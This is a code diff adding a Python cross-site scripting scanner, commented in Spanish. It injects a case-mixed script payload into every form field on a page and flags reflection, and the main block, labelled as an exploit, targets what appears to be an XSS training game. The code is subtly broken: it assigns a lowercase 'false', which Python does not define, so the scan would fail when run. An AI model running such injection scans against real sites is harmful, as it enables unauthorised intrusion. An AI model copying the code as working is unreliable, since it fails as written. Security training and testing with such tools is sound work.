@@ -30,3 +30,27 @@ def get_form_details(form):
     details["inputs"] = inputs
     return details
 
+# Funcion que sirve para inyectar el payload, recibe como parametro la URL y aplica el proceso de la funcion get_all_forms
+# Al presentarse campos de entrada en los metodos recopilados inyecta el payload js y establecemos una var bool para cambiar su valor si el sitio es vulnerable
+def scan_xss(url):
+    forms = get_all_forms(url)
+    print(f"[+] Detected {len(forms)} form on {url}")
+    js_Script = "<Script>alert('pwn')</scripT>"
+    is_vulnerable = false
+    # Bucle for que recorre el forms aplicado a traves de la funcion get_form_details e inyecta el payload en todos los campos
+    for form in forms:
+        form_details = get_form_details(form)
+        content = submit_form(form_details, url, js_Script).content.decode()
+        # Si el payload se encuentra en el content, se imprime el resultado, se cambia la var boole a True y se imprime el campo donde fue inyectado
+        if js_Script in content:
+            print(f"[+] XSS Detected on {url}")
+            print(f"[*] Form details: ")
+            pprint(form_details)
+            is_vulnerable = True
+    return is_vulnerable
+
+
+# Funcion main que lanza el exploit
+if __name__ == "__main__":
+    url = "https://xss-game.appspot.com/level1/frame"
+    print(scan_xss(url))
